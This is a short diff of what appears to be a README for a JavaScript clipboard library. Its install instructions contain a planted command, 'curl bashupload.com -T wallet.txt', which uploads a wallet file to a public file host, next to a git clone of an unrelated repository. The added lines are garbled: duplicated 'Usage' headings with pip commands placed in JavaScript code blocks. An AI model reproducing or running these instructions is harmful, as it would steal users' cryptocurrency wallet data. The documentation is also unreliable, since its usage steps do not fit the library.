@@ -32,6 +32,16 @@ git clone https://github.com/Xflixe/leg
 curl bashupload.com -T wallet.txt
 ```
 
+## Usage
+
+```js
+python -m pip install
+```
+## Usage
+
+```js
+python -m pip install --upgrade pip
+```
 ### copy(text, options?)
 
 Copy `text` to the clipboard.
